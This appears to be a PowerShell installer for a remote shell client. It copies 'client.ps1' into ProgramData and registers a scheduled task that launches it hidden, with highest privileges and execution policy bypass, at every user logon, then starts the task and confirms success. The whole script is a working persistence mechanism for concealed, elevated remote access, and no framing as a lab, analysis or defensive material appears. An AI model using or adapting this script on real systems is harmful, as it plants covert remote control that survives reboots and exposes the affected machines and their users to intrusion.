$ErrorActionPreference = 'Stop'

$dir = Join-Path $env:ProgramData 'rshell-client'
New-Item -ItemType Directory -Force -Path $dir | Out-Null
Copy-Item -LiteralPath (Join-Path $PSScriptRoot 'client.ps1') -Destination (Join-Path $dir 'client.ps1') -Force

$tr = 'powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "' + (Join-Path $dir 'client.ps1') + '"'
schtasks /Create /TN RShellClient /TR $tr /SC ONLOGON /RL HIGHEST /F | Out-Null
schtasks /Run /TN RShellClient | Out-Null
Start-Sleep -Seconds 2
schtasks /Query /TN RShellClient /FO LIST | Select-String 'TaskName|Status|Run As User'
Write-Output '[OK] RShellClient task registered and started'
